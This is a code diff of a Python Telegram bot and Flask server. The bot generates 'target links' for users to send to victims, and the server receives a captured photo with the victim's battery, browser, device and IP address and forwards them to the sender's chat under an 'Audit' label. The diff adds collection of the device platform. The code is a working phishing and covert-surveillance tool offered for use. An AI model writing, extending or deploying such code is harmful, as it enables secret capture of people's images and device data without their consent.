@@ -27,14 +27,14 @@ def start(message):
 def callback_query(call):
     if "m_" in call.data:
         mode = call.data.replace("m_", "")
-        link = f"https://{request.host}/?m={mode}&uid={call.message.chat.id}"
+        target_link = f"https://{request.host}/?m={mode}&uid={call.message.chat.id}"
         
         response_text = (
             f"🤠 It's your target link 🔗 just send it your target 🎯\n\n"
-            f"Url = ( {link} )\n\n"
+            f"Url = ( {target_link} )\n\n"
             f"✨ Thank you team HCO ✨"
         )
-        bot.send_message(call.message.chat.id, response_text, disable_web_page_preview=True)
+        bot.send_message(call.message.chat.id, response_text, parse_mode='HTML', disable_web_page_preview=True)
 
 @app.route('/')
 def index():
@@ -49,6 +49,7 @@ def upload():
         caption = (f"🛡️ <b>Audit:</b> {data.get('mode').upper()}\n"
                    f"🔋 <b>Battery:</b> {info.get('battery')}\n"
                    f"🌐 <b>Browser:</b> {info.get('browser')}\n"
+                   f"📱 <b>Device:</b> {info.get('platform')}\n"
                    f"📍 <b>IP:</b> {request.remote_addr}\n\n"
                    f"✨ Created by Roshan ✨")
         bot.send_photo(data.get('uid'), img_data, caption=caption, parse_mode='HTML')
